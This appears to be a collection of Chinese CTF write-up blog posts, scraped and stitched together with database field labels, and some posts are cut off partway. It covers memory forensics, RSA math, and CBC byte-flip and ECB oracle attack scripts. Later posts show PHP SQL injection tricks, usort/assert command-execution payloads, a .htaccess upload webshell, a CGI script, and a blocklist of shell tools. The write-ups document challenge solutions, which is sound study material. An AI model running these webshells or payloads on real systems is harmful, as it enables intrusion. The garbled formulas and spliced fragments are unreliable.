еңЁзҪ‘дёҠжҹҘйҳ…иө„ж–ҷзҡ„ж—¶еҖҷеҹәжң¬жІЎжңүи§ҒиҝҮжңүж–Үз« жҸҗеҲ°Hashи®Ўз®—зҡ„ж—¶еҖҷдёәдәҢиҝӣеҲ¶пјҢзӣҙжҺҘжІ»еҘҪдәҶжҲ‘зҡ„дҪҺиЎҖеҺӢ

posts.text: еүҚдёӨеӨ©еҲҡжү“зҡ„ShadowCTFпјҢйҒҮеҲ°дәҶдёҖдәӣеҶ…еӯҳеҸ–иҜҒзҡ„йўҳзӣ®пјҢиҝҷйҮҢеҒҡдёҖдәӣи®°еҪ• PwnйўҳеҮәеҫ—еӨӘжЈ’дәҶ йҰ–е…ҲжҳҜдёҖдёӘзі»еҲ—зҡ„еҶ…еӯҳеҸ–иҜҒ Suspicious Riddle The Riddler has infected batmanвҖҷs PC with some suspicious programs. Find the PID of the suspicious program. иҰҒжұӮжүҫеҲ°еҸҜз–‘иҝӣзЁӢзҡ„PID 1volatility -f shadow.raw imageinfo жҹҘзңӢеҶ…еӯҳй•ңеғҸзҡ„дҝЎжҒҜпјҢиҝҷйҮҢдјҡз»ҷеҮәеҸҜиғҪзҡ„ж“ҚдҪңзі»з»ҹзүҲжң¬пјҢиҝҷдёӘеҜ№дәҺеҗҺз»ӯзҡ„е·ҘдҪңжҳҜеҫҲйҮҚиҰҒзҡ„ 1234567891011121314Volatility Foundation Volatility Framework 2.6INFO : volatility.debug : Determining profile based on KDBG search... Suggested Profile(s) : Win7SP1x64, Win7SP0x64, Win2008R2SP0x64, Win2008R2SP1x64_24000, Win2008R2SP1x64_23418, Win2008R2SP1x64, Win7SP1x64_24000, Win7SP1x64_23418 AS Layer1 : WindowsAMD64PagedMemory (Kernel AS) AS Layer2 : FileAddressSpace (/root/shadow.raw) PAE type : No PAE DTB : 0x187000L KDBG : 0xf80002a050a0L Number of Processors : 1 Image Type (Service Pack) : 1 KPCR for CPU 0 : 0xfffff80002a06d00L KUSER_SHARED_DATA : 0xfffff78000000000L Image date and time : 2021-01-20 21:08:55 UTC+0000 Image local date and time : 2021-01-21 01:08:55 +0400 еҸҜд»ҘзңӢеҲ°еҸҜиғҪзҡ„ж“ҚдҪңзі»з»ҹжңүеҫҲеӨҡпјҢдёҖдёӘдёҖдёӘең°е°қиҜ•пјҢжҺҘдёӢжқҘжҹҘзңӢеҪ“ж—¶жӯЈеңЁиҝҗиЎҢзҡ„иҝӣзЁӢ 1volatility -f shadow.raw --profile=Win7SP1x64 psscan иҝҷйҮҢжҢҮе®ҡзҡ„зі»з»ҹзүҲжң¬дёәWin7SP1x64пјҢеҸҜд»ҘзңӢеҲ°psscanзҡ„жү«жҸҸз»“жһңпјҢе°ұиҜҙжҳҺж“ҚдҪңзі»з»ҹеҹәжң¬е°ұжҳҜWin7SP1x64дәҶ еҰӮжһңжҢҮе®ҡзҡ„зі»з»ҹзүҲжң¬еҮәе…ҘеҫҲеӨ§зҡ„иҜқпјҢpsscanжҳҜжІЎжңүжү«жҸҸз»“жһңзҡ„ 10x0000000033147630 riddle.exe 2816 1764 0x00000000178ee000 2021-01-20 21:08:24 UTC+0000 иҝҷйҮҢеҸҜд»ҘзңӢеҲ°дёҖдёӘriddle.exeпјҢPIDдёә2816 йӮЈд№Ҳе°ұи§ЈеҮәдәҶз¬¬дёҖдёӘйўҳ ShadowCTF{2816} Hash Riddle Batman needs to identify what the executable is doing. Find the md5 hash of the suspicious program. Use the same raw image as Suspicious Riddle Challenge иҝҷйҮҢиҰҒжұӮжҲ‘д»¬жүҫеҮәеҸҜз–‘зЁӢеәҸзҡ„md5еҖј йӮЈд№Ҳе°ұйңҖиҰҒжҠҠзЁӢеәҸеҜјеҮәпјҢеҶҚи®Ўз®—md5еҖј й”ҷиҜҜи§Јжі• зңӢжҲ‘filescanжүҫеҮәеҸҜжү§иЎҢж–Үд»¶еҶҚеҜјеҮәе°ұе®ҢдәӢдәҶ 12345volatility -f shadow.raw --profile=Win7SP1x64 filescan | grep riddle.exe 0x0000000030e18dc0 2 0 R--r-d \Device\HarddiskVolume1\Users\batman\Desktop\riddle.exe0x0000000030e44f20 15 0 R--r-d \Device\HarddiskVolume1\Users\batman\Desktop\riddle.exe0x000000003315aa90 16 0 R--rwd \Device\HarddiskVolume1\Users\batman\Desktop\riddle.exe wcпјҹжҖҺд№ҲжңүдёүдёӘпјҹдёҚз®ЎдәҶпјҢзӣҙжҺҘdumpfilesпјҢдёҖдёӘдёӘз®—md5дәӨflagе°ұе®ҢдәӢдәҶ 12345678volatility -f shadow.raw --profile=Win7SP1x64 dumpfiles -Q 0x0000000030e18dc0 -D ~/test/volatility -f shadow.raw --profile=Win7SP1x64 dumpfiles -Q 0x0000000030e44f20 -D ~/test/volatility -f shadow.raw --profile=Win7SP1x64 dumpfiles -Q 0x000000003315aa90 -D ~/test/md5sum ~/test/* b05e889e8436ed89157a2aa0cb8cdaa6 file.None.0xfffffa8000b5b2b0.datb8e7f5ac3579fba5a59d3eebfda80194 file.None.0xfffffa8002869280.imgc699187e1f235cb919c3bd602e99a452 file.None.0xfffffa8002c07bd0.dat ShadowCTF{b05e889e8436ed89157a2aa0cb8cdaa6} й”ҷиҜҜ ShadowCTF{b8e7f5ac3579fba5a59d3eebfda80194} й”ҷиҜҜ ShadowCTF{c699187e1f235cb919c3bd602e99a452} й”ҷиҜҜ еҲ°иҝҷйҮҢдәәйғҪжҮөдәҶпјҢе°қиҜ•иҝҮеҜ№ж–Үд»¶дҪҝз”ЁforemostпјҢдҪҶжҳҜи§ЈеҮәзҡ„exeж–Үд»¶иҝҳжҳҜй”ҷиҜҜзҡ„ жӯЈзЎ®и§Јжі• 1volatility -f shadow.raw --profile=Win7SP1x64 procdump -p 2816 -D ~/test/ е°ҶиҝӣзЁӢеҜјеҮәеҸҜжү§иЎҢж–Үд»¶ 12md5sum ~/test/executable.2816.exeb4ef3e812db14a363f51efa379729715 /root/test/executable.2816.exe ShadowCTF{b4ef3e812db14a363f51efa379729715} Source Riddle You found the suspicious executable, but how did it get there? His butler Alfred might have explored some malicious link. What is the riddler trying to do? иҝҷйҮҢй—®иҝӣзЁӢеңЁе№Іеҳӣ йҰ–е…Ҳз”ЁжҺ’йҷӨжі•пјҢиӮҜе®ҡдёҚжҳҜеңЁжҢ–зҹҝ е…ҲзңӢзңӢжңүе“Әдәӣж–Үд»¶пјҢз„¶еҗҺеҶҚеҺ»зңӢз”ЁжҲ·е’ҢжіЁеҶҢиЎЁе•Ҙзҡ„пјҢеӨ§жҰӮжҳҜиҝҷдёӘжҖқи·Ҝ 123volatility -f shadow.raw --profile=Win7SP1x64 filescan | grep batman 0x0000000031729380 16 0 R--rwd \Device\HarddiskVolume1\Users\batman\Desktop\meta_dense.png иҝҷйҮҢзңӢеҲ°дәҶжЎҢйқўдёҠжңүдёӘеӣҫзүҮпјҢеҸҜд»ҘеҜјеҮәзңӢзңӢ 1volatility -f shadow.raw --profile=Win7SP1x64 dumpfiles -Q 0x0000000031729380 -D ~/test/ еҸҜд»ҘзңӢеҲ°дёҖдёӘдёӯеҝғиў«жүӯжӣІзҡ„еӣҫзүҮпјҢдёҠйқўеҶҷзқҖflagпјҢpsдёҖдёӢе°ұиғҪзңӢжё…жҘҡflagдәҶ ShadowCTF{P3nult1m4t3_R1ddl3_S0lv3d} жңҖеҗҺдёҖдёӘз»ҷдәҶдёҖдёӘиҺ«еҗҚе…¶еҰҷзҡ„еӯ—з¬ҰдёІпјҢbasecrackи§ЈдёҚеҮәжқҘпјҢжҮ’еҫ—еҒҡдәҶ еҸҰеӨ–иҝҳжңүдёҖдёӘеҶ…еӯҳеҸ–иҜҒзҡ„йўҳпјҢжҳҜWin10X64зҡ„зі»з»ҹпјҢVolatility2зҡ„дёҖдәӣжЁЎеқ—еңЁеӨ„зҗҶWin10зі»з»ҹж—¶дјҡжҠҘй”ҷпјҢз”ЁVolatility3е°ұиЎҢпјҢз„¶еҗҺдёҖдәӣжЁЎеқ—зҡ„з”Ёжі•еҸҜиғҪе’ҢVol2жңүеҮәе…Ҙ иҝҷдёӘйўҳеҜјеҮәдёҖдёӘеҸӘжңүдёҖеҚҠзҡ„flagзҡ„еӣҫзүҮпјҢиҜ•дәҶдёҖдёӢеёёи§„йҡҗеҶҷжІЎжңүеҸ‘зҺ°пјҢд№ҹжҮ’еҫ—еҶҚж…ўж…ўеј„дәҶ

posts.excerpt: Baby Step Giant Step вҖ“ е°ҸжӯҘеӨ§жӯҘз®—жі•
posts.text: Baby Step Giant Step вҖ“ е°ҸжӯҘеӨ§жӯҘз®—жі• з”ЁдәҺжұӮи§ЈеҪўеҰӮ axвүЎbmod na^x вүЎ b \mod naxвүЎbmodn зҡ„й—®йўҳ(gcd(a,n)=1,x<ngcd(a, n) = 1, x < ngcd(a,n)=1,x<n) е°ҶxиҪ¬дёә iвҲ—mвҲ’ji*m - jiвҲ—mвҲ’j зҡ„еҪўејҸ axвүЎbmod na^x вүЎ b \mod naxвүЎbmodn a(iвҲ—mвҲ’j)вүЎbmod na^{(i*m - j)} вүЎ b \mod na(iвҲ—mвҲ’j)вүЎbmodn a(iвҲ—m)вүЎbвҲ—ajmod na^{(i*m)} вүЎ b*a^j \mod na(iвҲ—m)вүЎbвҲ—ajmodn еҜ№дәҺеҸіиҫ№пјҢjйҒҚеҺҶ[0, m-1]пјҢи®Ўз®—з»“жһңиҝӣиЎҢеӯҳеӮЁ еҜ№дәҺе·Ұиҫ№пјҢiйҒҚеҺҶ[0, nm\frac{n}{m}mnвҖӢ]пјҢи®Ўз®—з»“жһңеңЁеҸіиҫ№зҡ„еӯҳеӮЁдёӯиҝӣиЎҢжҗңзҙў и®Ўз®—ж—¶й—ҙеӨҚжқӮеәҰдёәO(nm+m\frac{n}{m}+mmnвҖӢ+m) еҪ“nm=m\frac{n}{m} = mmnвҖӢ=mж—¶ еҚіm=nm = \sqrt{n}m=nвҖӢж—¶ и®Ўз®—ж—¶й—ҙеӨҚжқӮеәҰжңҖе°ҸпјҢдёәO(2n2\sqrt{n}2nвҖӢ) дҫӢеҰӮпјҡ[зҪ‘йјҺжқҜ2020йқ’йҫҷз»„] posts.text: WebзӢ—еҒҡдёҚжқҘMiscжүҖд»ҘжҠҠCryptoз»ҷAKдәҶ happy дёҖејҖе§Ӣйўҳзӣ®дёҠй”ҷйҷ„д»¶жөӘиҙ№еҝ«дёӨдёӘе°Ҹж—¶пјҢжңүзӮ№ж— иҜӯ 1234('c=', '0x7a7e031f14f6b6c3292d11a41161d2491ce8bcdc67ef1baa9eL')('e=', '0x872a335')#q + q*p^3 =1285367317452089980789441829580397855321901891350429414413655782431779727560841427444135440068248152908241981758331600586#qp + q *p^2 = 1109691832903289208389283296592510864729403914873734836011311325874120780079555500202475594 a=q+qвҲ—p3a = q+q*p^3a=q+qвҲ—p3 b=qвҲ—p+qвҲ—p2b = q*p+q*p^2b=qвҲ—p+qвҲ—p2 x=gcd(a,b)x = gcd(a,b)x=gcd(a,b) ab=q+qвҲ—p3qвҲ—p+qвҲ—p2=1+p3p+p2=a/xb/x\frac{a}{b} = \frac{q+q*p^3}{q*p+q*p^2} = \frac{1+p^3}{p+p^2} = \frac{a/x}{b/x}baвҖӢ=qвҲ—p+qвҲ—p2q+qвҲ—p3вҖӢ=p+p21+p3вҖӢ=b/xa/xвҖӢ еӣ ејҸеҲҶи§Ј 1+p3p+p2=(1+p)вҲ—(p2вҲ’p+1)pвҲ—(1+p)=p2вҲ’p+1p\frac{1+p^3}{p+p^2} = \frac{(1+p)*(p^2-p+1)}{p*(1+p)} = \frac{p^2-p+1}{p}p+p21+p3вҖӢ=pвҲ—(1+p)(1+p)вҲ—(p2вҲ’p+1)вҖӢ=pp2вҲ’p+1вҖӢ иҝҷйҮҢb/xзҡ„еҖјдёәзҙ ж•°пјҢе°қиҜ•дҪңдёәpиҝӣиЎҢи§ЈеҜҶ 12345678910111213141516import gmpy2from Crypto.Util.number import *c=0x7a7e031f14f6b6c3292d11a41161d2491ce8bcdc67ef1baa9ee=0x872a335#q + q*p^3 =1285367317452089980789441829580397855321901891350429414413655782431779727560841427444135440068248152908241981758331600586#qp + q *p^2 = 1109691832903289208389283296592510864729403914873734836011311325874120780079555500202475594a = 1285367317452089980789441829580397855321901891350429414413655782431779727560841427444135440068248152908241981758331600586b = 1109691832903289208389283296592510864729403914873734836011311325874120780079555500202475594x = gmpy2.gcd(a,b)p = b//xq = b//(p+p**2)n = p*qphi = (p-1)*(q-1)d = gmpy2.invert(e, phi)m = pow(c,d,n)print(long_to_bytes(m)) Yusaзҡ„еҜҶз ҒеӯҰиҜҫе Ӯ CBCз¬¬дёҖиҜҫ 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960from Crypto.Cipher import AESimport osflag='flag{********************************}'BLOCKSIZE = 16def pad(data): pad_len = BLOCKSIZE - (len(data) % BLOCKSIZE) if len(data) % BLOCKSIZE != 0 else 0 return data + "=" * pad_lendef unpad(data): return data.replace("=","")def enc(data,key,iv): cipher = AES.new(key,AES.MODE_CBC,iv) encrypt = cipher.encrypt(pad(data)) return encryptdef dec(data,key,iv): try: cipher = AES.new(key,AES.MODE_CBC,iv) encrypt = cipher.decrypt(data) return unpad(encrypt) except: exit()def task(): try: key = os.urandom(16) iv = os.urandom(16) pre = "yusa"*4 for _ in range(3): choice = raw_input(menu) if choice == '1': name = raw_input("What's your name?") if name == 'admin': exit() token = enc(pre+name,key,iv) print "Here is your token(in hex): "+iv.encode('hex')+token.encode('hex') continue elif choice == '2': token = raw_input("Your token(in hex): ").decode('hex') iv = token[:16] name = dec(token[16:],key,iv) print iv.encode('hex')+name.encode('hex') if name[:16] == "yusa"*4: print "Hello, "+name[16:] if name[16:] == 'admin': print flag exit() else: continue except: exit()menu='''1. register2. login3. exit'''if __name__ == "__main__": task() CBC Byte Flip еҰӮеӣҫжүҖзӨә жҲ‘д»¬иҰҒжҠҠplain2дёӯзҡ„жҹҗдёҖеӯ—иҠӮзҝ»иҪ¬дёәеҸҰдёҖеӯ—иҠӮ з”ұдәҺC1жқҘиҮӘдәҺcipher2иҝӣиЎҢBlock Cipher Decryptionд№ӢеҗҺзҡ„з»“жһң иҖҢдё”keyжңӘзҹҘпјҢе°ұдёҚиғҪзӣҙжҺҘеҫ—зҹҘC1зҡ„еҖј дҪҶжҳҜеӯ—иҠӮзҝ»иҪ¬зҡ„еҰҷеӨ„еңЁдәҺйҖҡиҝҮдҝ®ж”№дёҠдёҖз»„зҡ„еҜҶж–ҮжқҘзҝ»иҪ¬дёӢдёҖз»„зҡ„жҳҺж–ҮпјҢд»ҺиҖҢеҸҜд»Ҙе®Ңе…ЁеҝҪи§ҶиҝҷдёҖзӮ№ з”ұејӮжҲ–иҝҗз®—еҸҜд»ҘжҺЁеҜј B1 = A1 xor C1 йӮЈд№Ҳд№ҹжңүC1 = A1 xor B1 B1вҖҷ = A1вҖҷ xor C1 (A1вҖҷжҳҜдҝ®ж”№д№ӢеҗҺзҡ„еҜҶж–Үеӯ—иҠӮпјҢB1вҖҷжҳҜзҝ»иҪ¬д№ӢеҗҺзҡ„жҳҺж–Үеӯ—иҠӮ) иҖҢеҰӮжһңжҲ‘д»¬иғҪеӨҹдҝ®ж”№cipher1пјҢйӮЈд№Ҳе°ұиғҪеӨҹдҝ®ж”№A1зҡ„еҖј еҚіA1вҖҷ = A1 xor B1 xor B1вҖҷ A1вҖҷ xor C1 = A1 xor B1 xor B1вҖҷ xor C1 = C1 xor B1вҖҷ xor C1 = B1вҖҷ з”ЁдёүжқЎз®—ејҸжқҘиЎЁиҝ°дёҠйқўзҡ„иҜқе°ұжҳҜ B = A xor C BвҖҷ = AвҖҷ xor C AвҖҷ = A xor B xor BвҖҷ еӯ—иҠӮзҝ»иҪ¬зҡ„иҰҒжұӮд№ҹе°ұжҳҫиҖҢжҳ“и§ҒдәҶ еҜ№дәҺAе®Ңе…ЁеҸҜжҺ§ е·ІзҹҘBзҡ„еҖј еҲ°иҝҷйҮҢд№ҹеҸӘе®ҢжҲҗдәҶдёҖеҚҠ з”ұдәҺдҝ®ж”№дәҶA1 cipher1еңЁиҝӣиЎҢBCDзҡ„ж—¶еҖҷдјҡеҫ—еҮәй”ҷиҜҜзҡ„з»“жһң еҶҚдёҺIVзӣёејӮжҲ–еҲҷдјҡеҜјиҮҙplain1еҮәй”ҷ еҰӮжһңиғҪеӨҹеҫ—еҲ°дҝ®ж”№A1д№ӢеҗҺдә§з”ҹзҡ„й”ҷиҜҜзҡ„plain1зҡ„еҖј иҖҢдё”IVеҸҜд»Ҙе®Ңе…ЁжҺ§еҲ¶зҡ„иҜқ йӮЈд№Ҳе°ұиғҪеӨҹжҠҠеҲҡжүҚзҡ„жҠҠжҲҸеҶҚзҺ©дёҖйҒҚ B2 = A2 xor C2 B2вҖҷ = A2вҖҷ xor C2 A2вҖҷ = A2 xor B2 xor B2вҖҷ A2дёәеҺҹIV B2жҳҜй”ҷиҜҜзҡ„plain1 B2вҖҷжҳҜжӯЈзЎ®зҡ„plain1 BTW:жҜҸдёҖз»„Cipherзҡ„й•ҝеәҰдёә16Byte д»ҘдёҠеӨ§жҰӮд»Ӣз»ҚдәҶCBCеӯ—иҠӮзҝ»иҪ¬зҡ„ж”»еҮ»ж–№ејҸ йңҖиҰҒеҜҶж–Үд»ҘеҸҠIVеҸҜжҺ§жқҘж”№еҶҷжҳҺж–Ү 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647from pwn import *import binasciiimport timep = remote('das.wetolink.com',42888) # иҝһжҺҘp.recvline()p.recvline()p.recvline()p.recvline()p.sendline('1') # жіЁеҶҢp.recv()p.sendline('Admin') # з”ЁжҲ·еҗҚдёәAdminпјҢж–№дҫҝд№ӢеҗҺдҝ®ж”№data0 = p.recvline().decode()data0 = data0[28:124] # жҸҗеҸ–иҝ”еӣһж•°жҚ®йғЁеҲҶiv0 = data0[:32] #иҝ”еӣһзҡ„IVcipher00 = data0[32:64] #'yusayusayusayusa'зҡ„еҠ еҜҶз»“жһңcipher01 = data0[64:96] #'Admin'зҡ„еҠ еҜҶз»“жһңreplacement0 = str(hex(int(cipher00[:2],16)^ord('A')^ord('a')))[2:] # и®Ўз®—жӣҝжҚўеҜҶж–Үзҡ„еҖјpayload0 = iv0+replacement0+cipher00[2:]+cipher01 # еҸ‘йҖҒжӣҝжҚўеҜҶж–Үprint('data0: ',data0)print('payload0: ',payload0)p.recvline()p.recvline()p.recvline()p.recvline()p.sendline('2') # зҷ»е…Ҙp.recv()p.sendline(payload0) # еҸ‘йҖҒPayload0data1 = p.recvline()[:64+len('Admin')*2] # еҫ—еҲ°иҝ”еӣһзҡ„ж•°жҚ®data1 = data1.decode()plain1 = data1[32:64] # 'yusayusayusayusa'з”ұдәҺеҜҶж–Үиў«жӣҝжҚўпјҢи§ЈеҮәжқҘзҡ„жҳҺж–ҮжҳҜй”ҷиҜҜзҡ„пјҢд№ӢеҗҺеҸҜд»ҘиҝӣиЎҢејӮжҲ–дҝ®ж”№print('data1: ',data1)print('plain1: ',plain1)iv1 = str(hex(int(binascii.hexlify('yusa'.encode()).decode()*4,16)^int(plain1,16)^int(iv0,16)))[2:] # и®Ўз®—IVпјҢз”ЁдәҺдҝ®ж”№й”ҷиҜҜзҡ„жҳҺж–Үprint('iv1: ',iv1)payload1 = iv1+replacement0+cipher00[2:]+cipher01print('payload1: ',payload1)p.recvline()p.recvline()p.recvline()p.recvline()p.sendline('2') # зҷ»е…Ҙp.recv()p.sendline(payload1) # еҸ‘йҖҒPayload1p.recvline()p.recvline()print(p.recvline()) # еҫ—еҲ°flag Yusaзҡ„еҜҶз ҒеӯҰиҜҫе Ӯ ECB 1234567891011121314151617181920212223242526272829303132333435363738from Crypto.Cipher import AESimport osBLOCKSIZE = 16flag='flag{********************************}'def pad(data): pad_len = BLOCKSIZE - (len(data) % BLOCKSIZE) if len(data) % BLOCKSIZE != 0 else 0 return data + chr(pad_len) * pad_lendef unpad(data): num = ord(data[-1]) return data[:-num]def enc(data,key): cipher = AES.new(key,AES.MODE_ECB) encrypt = cipher.encrypt(pad(data)) return encryptdef dec(data,key): try: cipher = AES.new(key,AES.MODE_ECB) encrypt = cipher.decrypt(data) return unpad(encrypt) except: exit()def task(): try: key = os.urandom(16) while True: plaintext = raw_input("Amazing function: ").decode('hex') yusa = plaintext+flag print enc(yusa,key).encode('hex') except Exception as e: print str(e) exit()if __name__ == "__main__": task() иҝҷйҮҢзҡ„еҠ еҜҶзҡ„жҳҺж–Үдёә"иҫ“е…Ҙзҡ„hexиҪ¬еӯ—з¬Ұ"+вҖңflagвҖқ+Padding еҰӮжһңеҸ‘йҖҒзҡ„жҳҺж–Үдёә aaaaaaaaaaaa йӮЈд№ҲеҠ еҜҶзҡ„жҳҺж–Үдёә aaaaaaaaaaaaflag{XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX} еҲҶз»„Paddingд№ӢеҗҺзҡ„з»“жһңдёә aaaaaaaaaaaaflag {XXXXXXXXXXXXXXX XXXXXXXXXXXXXXXX X}+Padding еҲҶжһҗpadеҮҪж•°жҲ‘д»¬еҸҜд»ҘзҹҘйҒ“Paddingзҡ„еҖј иҖҢECBзҡ„еҠ еҜҶж–№ејҸе°ұжҳҜеҲҶз»„жҳҺж–ҮеҜҶж–Үд№Ӣй—ҙжІЎжңүе…іиҒ” йӮЈд№ҲжҲ‘д»¬е°ұеҸҜд»Ҙжһ„йҖ  вҖң?}+Padding"зҡ„жҳҺж–ҮеҺ»еҠ еҜҶпјҢ?дҪңдёәжҺ©з ҒпјҢflagеҶ…е®№й•ҝеәҰдёә32еӯ—иҠӮпјҢзӣ®жөӢжҳҜmd5пјҢжүҖд»Ҙеӯ—з¬ҰйӣҶзӣ®жөӢжҳҜ"0123456789abcdefвҖқ з„¶еҗҺжҲ‘д»¬еңЁеӯ—з¬ҰйӣҶйҮҢеҺ»зҲҶз ҙдёҖдҪҚжҺ©з ҒпјҢе°Ҷеҫ—еҲ°зҡ„з»“жһңдёҺеҠ еҜҶз»“жһңзҡ„жңҖеҗҺдёҖдёӘеҲҶз»„иҝӣиЎҢжҜ”иҫғпјҢиӢҘзӣёеҗҢеҲҷжҲ‘д»¬еҫ—еҲ°дәҶflagжңҖеҗҺдёҖдҪҚзҡ„еӯ—иҠӮ зҗҶи§ЈдәҶдёҠиҝ°еҶ…е®№д№ӢеҗҺе°ұеҸҜд»ҘеҶҷдёҖдёӘеҫӘзҺҜжқҘйҖҗдҪҚзҲҶз ҙflagпјҢжҜҸж¬ЎеҲқе§ӢеЎ«е……зҡ„aеӨҡдёҖдҪҚ aеңЁеҸҳй•ҝзҡ„иҝҮзЁӢдёӯйңҖиҰҒжіЁж„ҸжҳҺж–Үй•ҝеәҰдјҡеӨҡеҮәеҮ дёӘеҲҶз»„пјҢд»ҺиҖҢеҜјиҮҙеҜҶж–Үд№ҹеӨҡеҮәеҮ дёӘеҲҶз»„ 12345678910111213141516171819202122232425262728293031323334353637from pwn import *import binasciiimport timeplain = "flag{********************************}"flag = "}"BLOCKSIZE = 16char = '0123456789abcdef'p = remote('das.wetolink.com',42887)text = p.recv()for pad1 in range(12, 46): #print('61'*pad1) p.sendline('61'*pad1) text = p.recvline() print(len(text)) if len(text) <= 147: res = text.decode()[-33:-1] elif len(text) <= 179: res = text.decode()[-33-32:-1-32] else: res = text.decode()[-33-64:-1-64] #print(res) pad2 = (26-pad1)%16 #print(pad1) for j in char: time.sleep(0.1) payload = str(hex(ord(j)))[2:]+binascii.hexlify(flag.encode()).decode()+('0'+str(hex(pad2)[2:]))*pad2 #print(payload) p.sendline(payload) text = p.recvline().decode() #print(text) if res == text[18:18+32]: flag = j + flag print(flag) breakflag = "flag{" + flagprint(flag)

phieвҲ—dвүЎ1modphi eee, nnnдёәе…¬й’Ҙ; ddd, nnnдёәз§Ғй’Ҙ cвүЎmemod nc вүЎ m^e \mod ncвүЎmemodn mвүЎcdmod nm вүЎ c^d \mod nmвүЎcdmodn dp & dq mвүЎcdmod nm вүЎ c^d \mod nmвүЎcdmodn n=pвҲ—qn = p*qn=pвҲ—q nF(x) вүЎ (23*x^2 + 13*x + 61)*100 вүЎ 0 \mod nF(x)вүЎ(23вҲ—x2+13вҲ—x+61)вҲ—100вүЎ0modn F(x)вүЎx2+134вҲ—x+40вүЎ0mod nF(x) вүЎ x^2+134*x+40 вүЎ 0 \mod nF(x)вүЎx2+134вҲ—x+40вүЎ0modn G(x)=aвҲ—F(x)+nвҲ—KG(x) = a*F(x) + n*KG(x)=aвҲ—F(x)+nвҲ—K (Kдёәxзҡ„еӨҡйЎ№ејҸ) и§Јеҫ—G(6)=0G(6) = 0G(6)=0 еҚіF(6)вүЎ0mod nF(6) вүЎ 0 \mod nF(6)вүЎ0modn user{ public $hostname = '127.0.0.1'; public $username = 'root'; public $password = 'root'; public $database = 'ctf'; private $mysqli = null; public function __construct() { $this->mysqli = mysqli_connect( $this->hostname, $this->username, $this->password ); mysqli_select_db($this->mysqli,$this->database); } public function filter() { $_POST['username'] = addslashes($_POST['username']); $_POST['password'] = addslashes($_POST['password']); $safe1 = preg_match('/inn|or/is', $_POST['username']); $safe2 = preg_match('/inn|or/is', $_POST['password']); if($safe1 === 0 and $safe2 === 0){ return true; }else{ die('No hacker!'); } } public function login() { $this->filter(); $username = $_POST['username']; $password = $_POST['password']; $sql = "select * from user where username='%s' and password='$password'"; $sql = sprintf($sql,$username); $result = mysqli_query($this->mysqli,$sql); $result = mysqli_fetch_object($result); if($result->id){ return 1; }else{ return 0; } }session_start();if(isset($_GET['file'])){ if(preg_match('/flag/is', $_GET['file']) === 0) { echo file_get_contents('/'.$_GET['file']); }}if(isset($_POST['password'])){ $user = new user; $login = $user->login(); if($login) { echo "Success!"; } else { echo "Wrong!"; }}?> дёҖејҖе§ӢйқўеҜ№addslashes()иҝҳдёҚзҹҘйҒ“жҖҺд№ҲBypass з„¶еҗҺзңӢеҲ° $sql = sprintf($sql,$username); array_merge($_);$blacklist2 = array_merge($__);if (strlen($code)>16){ die('Too long');}foreach ($blacklist1 as $blacklisted) { if (preg_match ('/' . $blacklisted . '/m', $code)) { die('WTF???'); } } foreach ($blacklist2 as $blackitem) { if (preg_match ('/' . $blackitem . '/im', $code)) { die('Sry,try again'); }}@eval($code);?> иҝҮж»ӨдәҶеҫҲеӨҡеҶ…е®№ еҸҜд»ҘдҪҝз”ЁphpеҸҳй•ҝеҸӮж•° 1234?1[]=test&1[]=phpinfo()&2=assertecho var_dump(...$_GET);array(2) { [0]=> string(4) "test" [1]=> string(9) "phpinfo()" } string(6) "assert" дҪҝз”ЁusortиҝӣиЎҢе‘Ҫд»Өжү§иЎҢ пјҲassertж”ҜжҢҒеӨҡдёӘеҸӮж•°зҡ„д»Јз Ғжү§иЎҢпјү 12GET: 1[]=test&1[]=system('cat /flag_mdnrvvldb')&2=assertPOST: code=usort(...$GET); UNCTF вҖ”вҖ” easy_upload еҶ…е®№еҢ№й…Қ 1preg_match("/perl|pyth|ph|auto|curl|\|base|>|rm|ryby|openssl|war|lua|msf|xter|telnet/i",$black) иҝҷйҮҢзҡ„ вҖң||base|вҖңеҢ№й…ҚвҖқ|baseвҖқ иҜҰи§Ғ PHPжӯЈеҲҷдәҢж¬ЎиҪ¬д№ү(ж•°жҚ®еҲ йҷӨ) ж–Үд»¶еҗҚеҢ№й…Қ 1preg_match("/ph|ml|js|cg/i", $name) дёӨз§ҚжҖқи·Ҝ WebShell 123#.htaccessSetHandler application/x-httpd-p\hp 12#a.jpg<?=@eval($_GET["cmd"]); CGI 123#.htaccessOptions ExecCGIAddHandler cgi-script .xxx 123456#a.xxx#!/bin/bashecho "Content-Type: text/plain"echo ""cat /flagexit 0 зӣёе…ій“ҫжҺҘ .htaccess TrickеҲҶдә«пјҡhttps://evoa.me/archives/30/

posts.title: PHPж— еҸӮж•°RCE
posts.text: CTFдёӯPHPж— еҸӮж•°RCEе°Ҹз»“ ж ёеҝғд»Јз ҒеҰӮдёӢ 1234if(';' === preg_replace('/[^\W]+\((?R)?\)/', '', $_GET['code'])){ eval($_GET['code']);} дёҖиҲ¬дјҡеңЁжӯӨеҹәзЎҖдёҠиҝҮж»ӨдёҖдәӣеҮҪж•°д»ҘеўһеҠ йҡҫеәҰ жӯЈеҲҷиЎЁиҫҫејҸзҡ„з”ЁдәҺеҢ№й…Қж ·ејҸеҰӮдёӢзҡ„еӯ—з¬ҰдёІ a(); a(bb()); a(bb(ccc())); a()bb(); a(bb())ccc(dddd()); вҖҰ BTW: еҸҜиғҪеңЁжӯЈеҲҷйҖ’еҪ’еҢ№й…Қж—¶дјҡBanжҺүвҖҷ_вҖҷ еёёз”ЁеҮҪж•° get_defined_functions() : жҳҫзӨәжүҖжңүеҮҪж•° localeconv() : иҝ”еӣһдёҖдёӘеҢ…еҗ«жң¬ең°ж•°еӯ—еҸҠиҙ§еёҒж јејҸдҝЎжҒҜзҡ„ж•°з»„пјҢз¬¬дёҖдёӘе…ғзҙ дёәвҖҷ.вҖҷ scandir() : иҝ”еӣһжҢҮе®ҡзӣ®еҪ•дёӯзҡ„ж–Үд»¶е’Ңзӣ®еҪ•зҡ„ж•°з»„ pos() : иҫ“еҮәеҪ“еүҚеҶ…йғЁжҢҮй’ҲжүҖжҢҮеҗ‘зҡ„е…ғзҙ  current() : иҝ”еӣһж•°з»„еҪ“еүҚеҚ•е…ғпјҢеҗҢpos() end() : е°ҶеҶ…йғЁжҢҮй’ҲжҢҮеҗ‘ж•°з»„дёӯзҡ„жңҖеҗҺдёҖдёӘе…ғзҙ пјҢе№¶иҫ“еҮәгҖӮ next() : 